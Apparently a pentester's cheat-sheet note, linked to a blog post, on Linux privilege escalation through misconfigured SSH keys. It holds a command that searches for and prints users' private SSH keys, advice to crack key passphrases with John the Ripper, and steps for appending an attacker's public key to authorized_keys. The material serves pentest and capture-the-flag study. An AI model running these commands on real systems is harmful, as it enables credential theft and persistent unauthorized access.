[Linux Privilege Escalation - Exploiting Misconfigured SSH Keys - StefLan's Security Blog (steflan-security.com)](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/)

```sh
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
```

If SSH Private Key require a **Password**, then Bruteforce the Private Key *id_rsa* with [[John The Ripper]]

Check for the Encryption Algorithm used in `authorized_keys`!

#### If WRITE access is available to a users `/.ssh/` directory :-
- We can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
```sh
ssh keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
```

This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will *copy* to the remote machine.

```sh
# In Attacking machine
cat key.pub >> /root/.ssh/authorized_keys
```